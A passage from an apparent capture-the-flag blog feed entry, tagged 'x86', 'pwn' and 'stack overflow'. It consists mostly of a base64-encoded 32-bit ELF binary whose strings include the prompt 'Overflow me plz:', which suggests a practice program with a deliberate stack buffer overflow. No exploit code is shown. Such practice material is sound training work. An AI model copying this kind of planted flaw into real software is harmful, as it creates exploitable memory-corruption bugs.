+GMcEJCCgBAj/0MnDjbYAAAAAuCCgBAgtIKAECMH4AonCweofAdDR+HUBw7oAAAAAhdJ09lWJ5YPsGIlEJATHBCQgoAQI/9LJw4n2jbwnAAAAAIA9IKAECAB1
+E1WJ5YPsCOh8////xgUgoAQIAcnzw2aQoRCfBAiFwHQfuAAAAACFwHQWVYnlg+wYxwQkEJ8ECP/Qyel5////kOlz////ZpCQVVdWU+gn////gcN3GwAAg+wM
+i2wkII2zDP///+gn/v//jYMI////KcbB/gKF9nQlMf+NtgAAAACD7AT/dCQs/3QkLFX/lLsI////g8cBg8QQOfd144PEDFteX13DjXYA88MAAFOD7Ajow/7/
+/4HDExsAAIPECFvDAwAAAAEAAgBPdmVyZmxvdyBtZSBwbHo6AAAAAAEbAzsoAAAABAAAANz9//9EAAAALP7//2gAAABs////iAAAAMz////UAAAAFAAAAAAA
+AAABelIAAXwIARsMBASIAQAAIAAAABwAAACQ/f//QAAAAAAOCEYODEoPC3QEeAA/GjsqMiQiHAAAAEAAAAC8/f//QwAAAABBDgiFAkINBX/FDAQEAABIAAAA
+YAAAANz+//9dAAAAAEEOCIUCQQ4MhwNBDhCGBEEOFIMFTg4gaQ4kRA4oRA4sQQ4wTQ4gRw4UQcMOEEHGDgxBxw4IQcUOBAAAEAAAAKwAAADw/v//AgAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQhAQIMIQECAAAAAABAAAAAQAAAAwA
+AADIggQIDQAAAOSEBAgZAAAACJ8ECBsAAAAEAAAAGgAAAAyfBAgcAAAABAAAAPX+/2+sgQQIBQAAACyCBAgGAAAAzIEECAoAAABQAAAACwAAABAAAAAVAAAA
+AAAAAAMAAAAAoAQIAgAAABgAAAAUAAAAEQAAABcAAACwggQIEQAAAKiCBAgSAAAACAAAABMAAAAIAAAA/v//b4iCBAj///9vAQAAAPD//298ggQIAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABSfBAgAAAAAAAAAAAaDBAgWgwQIJoMECAAAAAAAAAAAR0NDOiAoVWJ1bnR1
+IDQuOC41LTR1YnVudHUyKSA0LjguNQAALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuQUJJLXRhZwAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5z
+eW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbC5keW4ALnJlbC5wbHQALmluaXQALnBsdC5nb3QALnRleHQALmZpbmkALnJvZGF0
+YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuamNyAC5keW5hbWljAC5nb3QucGx0AC5kYXRhAC5ic3MALmNvbW1l
+bnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAAAABAAAAAgAAAFSBBAhUAQAAEwAAAAAAAAAAAAAAAQAAAAAAAAATAAAA
+BwAAAAIAAABogQQIaAEAACAAAAAAAAAAAAAAAAQAAAAAAAAAIQAAAAcAAAACAAAAiIEECIgBAAAkAAAAAAAAAAAAAAAEAAAAAAAAADQAAAD2//9vAgAAAKyB
+BAisAQAAIAAAAAUAAAAAAAAABAAAAAQAAAA+AAAACwAAAAIAAADMgQQIzAEAAGAAAAAGAAAAAQAAAAQAAAAQAAAARgAAAAMAAAACAAAALIIECCwCAABQAAAA
+AAAAAAAAAAABAAAAAAAAAE4AAAD///9vAgAAAHyCBAh8AgAADAAAAAUAAAAAAAAAAgAAAAIAAABbAAAA/v//bwIAAACIggQIiAIAACAAAAAGAAAAAQAAAAQA
+AAAAAAAAagAAAAkAAAACAAAAqIIECKgCAAAIAAAABQAAAAAAAAAEAAAACAAAAHMAAAAJAAAAQgAAALCCBAiwAgAAGAAAAAUAAAAYAAAABAAAAAgAAAB8AAAA
+AQAAAAYAAADIggQIyAIAACMAAAAAAAAAAAAAAAQAAAAAAAAAdwAAAAEAAAAGAAAA8IIECPACAABAAAAAAAAAAAAAAAAQAAAABAAAAIIAAAABAAAABgAAADCD
+BAgwAwAACAAAAAAAAAAAAAAACAAAAAAAAACLAAAAAQAAAAYAAABAgwQIQAMAAKIBAAAAAAAAAAAAABAAAAAAAAAAkQAAAAEAAAAGAAAA5IQECOQEAAAUAAAA
+AAAAAAAAAAAEAAAAAAAAAJcAAAABAAAAAgAAAPiEBAj4BAAAGQAAAAAAAAAAAAAABAAAAAAAAACfAAAAAQAAAAIAAAAUhQQIFAUAACwAAAAAAAAAAAAAAAQA
+AAAAAAAArQAAAAEAAAACAAAAQIUECEAFAADAAAAAAAAAAAAAAAAEAAAAAAAAALcAAAAOAAAAAwAAAAifBAgIDwAABAAAAAAAAAAAAAAABAAAAAAAAADDAAAA
+DwAAAAMAAAAMnwQIDA8AAAQAAAAAAAAAAAAAAAQAAAAAAAAAzwAAAAEAAAADAAAAEJ8ECBAPAAAEAAAAAAAAAAAAAAAEAAAAAAAAANQAAAAGAAAAAwAAABSf
+BAgUDwAA6AAAAAYAAAAAAAAABAAAAAgAAACGAAAAAQAAAAMAAAD8nwQI/A8AAAQAAAAAAAAAAAAAAAQAAAAEAAAA3QAAAAEAAAADAAAAAKAECAAQAAAYAAAA
+AAAAAAAAAAAEAAAABAAAAOYAAAABAAAAAwAAABigBAgYEAAACAAAAAAAAAAAAAAABAAAAAAAAADsAAAACAAAAAMAAAAgoAQIIBAAAAQAAAAAAAAAAAAAAAEA
+AAAAAAAA8QAAAAEAAAAwAAAAAAAAACAQAAAjAAAAAAAAAAAAAAABAAAAAQAAAAEAAAADAAAAAAAAAAAAAABDEAAA+gAAAAAAAAAAAAAAAQAAAAAAAAA=
+&lt;/pre&gt;&lt;/div&gt;</content><category term="x86"></category><category term="pwn"></category><category term="stack overflow"></category></entry></feed>
